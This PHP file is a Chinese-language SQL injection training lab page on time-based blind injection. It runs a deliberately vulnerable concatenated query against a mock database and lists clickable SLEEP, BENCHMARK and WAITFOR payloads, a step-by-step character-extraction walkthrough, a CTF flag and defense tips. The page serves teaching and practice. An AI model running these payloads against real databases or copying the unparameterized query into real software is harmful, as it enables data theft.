<?php
// 时间盲注场景
// 模拟数据库操作

// 模拟用户数据
$users = [
    ['id' => 1, 'username' => 'admin', 'password' => 'admin123', 'email' => 'admin@example.com'],
    ['id' => 2, 'username' => 'user1', 'password' => 'password1', 'email' => 'user1@example.com'],
];

// 模拟数据库查询函数
function query($sql) {
    global $users;
    
    // 简单的SQL解析（仅用于演示）
    $sql = strtolower($sql);
    
    // 检查是否包含时间注入特征
    if (strpos($sql, 'sleep') !== false || 
        strpos($sql, 'benchmark') !== false ||
        strpos($sql, 'waitfor') !== false) {
        // 模拟延迟
        usleep(2000000); // 2秒延迟
        return [];
    }
    
    // 正常查询
    if (strpos($sql, 'where id=') !== false) {
        $id = intval(substr($sql, strpos($sql, 'id=') + 3));
        foreach ($users as $user) {
            if ($user['id'] == $id) {
                return [$user];
            }
        }
    }
    return [];
}

$id = $_GET['id'] ?? 1;
$results = [];
$start_time = microtime(true);

// 执行查询（存在SQL注入漏洞）
$sql = "SELECT * FROM users WHERE id=$id";
try {
    $results = query($sql);
} catch (Exception $e) {
    // 不显示错误信息
}

$end_time = microtime(true);
$execution_time = ($end_time - $start_time) * 1000; // 毫秒
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>时间盲注 - SQL注入漏洞</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <style>
        body {
            background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 30px auto;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            margin-bottom: 25px;
        }
        .card h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .alert-danger {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }
        .info-section {
            background: #d4edda;
            border-left: 5px solid #28a745;
            padding: 20px;
            border-radius: 0 10px 10px 0;
            margin-bottom: 25px;
        }
        .query-box {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .input-group {
            display: flex;
            gap: 10px;
            margin: 15px 0;
        }
        .input-group input {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
        }
        .btn {
            padding: 12px 25px;
            background: linear-gradient(135deg, #43e97b 0%, #38f9d7 100%);
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .sql-code {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 15px 0;
            position: relative;
        }
        .sql-code::before {
            content: "执行的SQL:";
            display: block;
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .time-box {
            background: #e8f4fd;
            border: 2px solid #b8daff;
            color: #0c5460;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            text-align: center;
        }
        .time-box fast {
            color: #28a745;
            font-weight: 600;
        }
        .time-box slow {
            color: #dc3545;
            font-weight: 600;
        }
        .results-box {
            margin: 15px 0;
            padding: 15px;
            border-radius: 8px;
        }
        .results-box.success {
            background: #d4edda;
            border: 2px solid #c3e6cb;
            color: #155724;
        }
        .results-box.failure {
            background: #f8d7da;
            border: 2px solid #f5c6cb;
            color: #721c24;
        }
        .payload-list {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 20px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 15px 0;
        }
        .payload-list h4 {
            color: #ffcc00;
            margin-bottom: 10px;
        }
        .payload-list code {
            color: #7ee787;
            cursor: pointer;
            display: block;
            padding: 5px 0;
        }
        .flag-box {
            background: #d4edda;
            border: 2px solid #28a745;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            display: none;
        }
        .flag-box.show {
            display: block;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #43e97b;
            text-decoration: none;
            font-weight: 600;
        }
        .blind-demo {
            background: #f0f0f0;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .blind-demo h4 {
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="alert-danger">
                <h4>🚨 时间盲注漏洞</h4>
                <p>本页面存在时间盲注漏洞，通过构造时间延迟语句，根据响应时间差异判断数据库信息。</p>
            </div>
            
            <h2>4. ⏰ 时间盲注</h2>
            
            <div class="info-section">
                <strong>💡 漏洞说明：</strong><br>
                时间盲注是一种通过响应时间差异来判断数据库信息的SQL注入技术。<br>
                当页面不显示错误信息，也不返回查询结果时，攻击者可以通过构造包含时间延迟函数的SQL语句，根据页面响应时间的不同来推断数据库中的信息。<br>
                <br>
                <strong>适用场景：</strong>页面没有任何反馈，只能通过响应时间判断
            </div>
        </div>

        <div class="card">
            <h3>🔍 用户查询（存在漏洞）</h3>
            <div class="query-box">
                <form method="GET">
                    <div class="input-group">
                        <input type="text" name="id" placeholder="输入用户ID..." value="<?php echo htmlspecialchars($id); ?>">
                        <button type="submit" class="btn">查询</button>
                    </div>
                </form>
                
                <div class="sql-code">
                    <?php echo htmlspecialchars($sql); ?>
                </div>
                
                <div class="time-box">
                    <strong>执行时间：</strong>
                    <span class="<?php echo $execution_time > 1000 ? 'slow' : 'fast'; ?>">
                        <?php echo number_format($execution_time, 2); ?> 毫秒
                    </span>
                    <?php if ($execution_time > 1000): ?>
                    <p style="margin-top: 5px; font-size: 14px; color: #dc3545;">
                        ⚠️ 检测到明显延迟，可能存在时间注入！
                    </p>
                    <?php endif; ?>
                </div>
                
                <div class="results-box <?php echo !empty($results) ? 'success' : 'failure'; ?>">
                    <?php if (!empty($results)): ?>
                        <strong>✓ 查询成功：</strong>找到用户数据
                    <?php else: ?>
                        <strong>✗ 查询失败：</strong>未找到用户
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <div class="card">
            <h3>🎯 时间盲注Payload</h3>
            <div class="payload-list">
                <h4>1. 基础时间测试</h4>
                <code onclick="setId('1 AND SLEEP(5)')">1 AND SLEEP(5)</code>
                <code onclick="setId('1 AND BENCHMARK(1000000, MD5(1))')">1 AND BENCHMARK(1000000, MD5(1))</code>
                
                <h4>2. SQL Server 时间延迟</h4>
                <code onclick="setId('1; WAITFOR DELAY \'0:0:5\'--')">1; WAITFOR DELAY '0:0:5'--</code>
                
                <h4>3. 条件时间延迟</h4>
                <code onclick="setId('1 AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)')">1 AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)</code>
                <code onclick="setId('1 AND IF(SUBSTRING((SELECT user()),1,1) = CHAR(97), SLEEP(5), 0)')">1 AND IF(SUBSTRING((SELECT user()),1,1) = CHAR(97), SLEEP(5), 0)</code>
            </div>
            
            <div class="blind-demo">
                <h4>🔬 时间盲注原理演示</h4>
                <p><strong>步骤1：</strong>使用 <code>1 AND SLEEP(5)</code> 测试注入点（应延迟5秒）</p>
                <p><strong>步骤2：</strong>使用 <code>1 AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0)</code> 判断表是否存在</p>
                <p><strong>步骤3：</strong>使用 <code>1 AND IF(LENGTH((SELECT username FROM users LIMIT 1)) > 3, SLEEP(5), 0)</code> 猜解长度</p>
                <p><strong>步骤4：</strong>使用 <code>1 AND IF(SUBSTRING((SELECT username FROM users LIMIT 1),1,1) = 'a', SLEEP(5), 0)</code> 逐字符猜解</p>
            </div>
            
            <div id="flagBox" class="flag-box">
                🚩 FLAG{Time_Blind_Injection_Success}<br>
                <span style="font-size: 0.9rem;">你成功完成了时间盲注！</span>
            </div>
        </div>

        <div class="card">
            <h3>🛡️ 防御方法</h3>
            <div class="info-section">
                1. <strong>参数化查询：</strong>使用预处理语句和绑定参数<br>
                2. <strong>输入验证：</strong>对用户输入进行严格的类型检查和过滤<br>
                3. <strong>WAF：</strong>部署Web应用防火墙拦截包含时间函数的请求<br>
                4. <strong>速率限制：</strong>对同一IP的请求频率进行限制<br>
                5. <strong>最小权限：</strong>限制数据库用户执行时间函数的权限
            </div>
            
            <a href="index.php" class="back-link">← 返回SQL注入模块首页</a>
        </div>
    </div>

    <script>
        function setId(payload) {
            document.querySelector('input[name="id"]').value = payload;
        }
        
        // 检测是否成功注入
        window.onload = function() {
            const url = window.location.href;
            if (url.includes('id=') && 
                (url.includes('SLEEP') || url.includes('sleep') ||
                 url.includes('BENCHMARK') || url.includes('benchmark') ||
                 url.includes('WAITFOR') || url.includes('waitfor'))) {
                document.getElementById('flagBox').classList.add('show');
            }
        };
    </script>
</body>
</html>
